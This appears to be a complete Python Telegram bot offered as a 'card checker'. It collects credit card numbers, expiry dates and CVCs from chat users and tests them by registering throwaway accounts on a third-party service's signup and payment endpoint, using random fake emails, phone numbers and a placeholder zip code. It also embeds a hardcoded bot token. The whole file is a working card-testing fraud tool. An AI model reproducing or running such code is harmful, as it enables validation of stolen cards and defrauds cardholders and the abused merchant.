import telebot
import requests
import random
import string
import urllib.parse

# Your Telegram bot token (always used)
BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
bot = telebot.TeleBot(BOT_TOKEN)

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 Welcome to Card Checker Bot\n"
        "Please enter your credit card details in the format:\n"
        "CardNumber|ExpMonth|ExpYear|CVC\n"
        "Example:\n4242424242424242|10|28|123"
    )

@bot.message_handler(func=lambda m: '|' in m.text)
def card_handler(message):
    try:
        card_number, exp_month, exp_year, cvc = map(str.strip, message.text.split('|'))
        email = generate_random_email()
        phone = f"+1{random.randint(2000000000, 9999999999)}"

        with requests.Session() as session:
            # Step 1: GET CSRF cookie and session cookie
            csrf_resp = session.get(
                "https://api.pocketpa.com/sanctum/csrf-cookie",
                headers={
                    "ppa-locale": "en",
                    "accept": "application/json",
                    "origin": "https://app.pocketpa.com",
                    "referer": "https://app.pocketpa.com/"
                }
            )
            # Extract and decode XSRF-TOKEN cookie value
            raw_token = session.cookies.get("XSRF-TOKEN", "")
            xsrf_token = urllib.parse.unquote(raw_token)

            payload = {
                "name": "Telegram User",
                "email": email,
                "phone": phone,
                "country_code": "1",
                "password": "TempPass123!",
                "locale": "en",
                "plan_id": "price_1NK6JMDuSyQMYtIMfauDnsfM",
                "zip_code": "H0H0H0",
                "card": {
                    "number": card_number,
                    "exp_month": exp_month,
                    "exp_year": exp_year,
                    "cvc": cvc
                }
            }

            # Step 2: POST register with session cookies and XSRF header
            response = session.post(
                "https://api.pocketpa.com/api/register",
                json=payload,
                headers={
                    "x-xsrf-token": xsrf_token,
                    "ppa-locale": "en",
                    "accept": "application/json",
                    "content-type": "application/json",
                    "origin": "https://app.pocketpa.com",
                    "referer": "https://app.pocketpa.com/"
                }
            )

            # Parse response
            resp_json = response.json()
            if response.status_code == 200 and resp_json.get('status') == 'success':
                bot.reply_to(message, f"✅ Success! Email used: {email}")
            else:
                bot.reply_to(message, f"❌ Declined or error: {resp_json.get('message', response.text)}")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

bot.infinity_polling()